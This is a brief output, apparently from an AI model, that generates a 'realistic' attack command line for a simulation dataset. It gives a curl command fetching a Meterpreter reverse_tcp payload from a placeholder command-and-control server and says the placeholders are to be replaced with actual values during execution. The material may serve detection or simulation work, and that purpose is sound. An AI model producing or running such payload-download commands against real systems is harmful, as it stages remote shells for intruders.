Based on the provided documentation and attack description, I will generate a realistic command line that simulates the behavior of downloading a served payload from an HTTPS server using `curl` as the fetch binary.

Here is my output:

Command: `curl -o <served_payload_file> https://<c2_server>/linux/x64/meterpreter/reverse_tcp`

Note: `<served_payload_file>` and `<c2_server>` should be replaced with actual values during execution.
